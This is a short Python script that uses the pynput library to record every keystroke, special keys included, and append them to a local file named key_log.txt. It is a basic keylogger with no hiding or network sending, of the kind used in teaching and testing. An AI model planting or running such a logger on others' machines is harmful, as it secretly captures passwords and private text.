from pynput.keyboard import Listener

# File to store keystrokes
log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")  # Write character to the file
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")   # For special keys like Space, Enter, etc.

# Start listening to the keyboard
with Listener(on_press=on_press) as listener:
    listener.join()
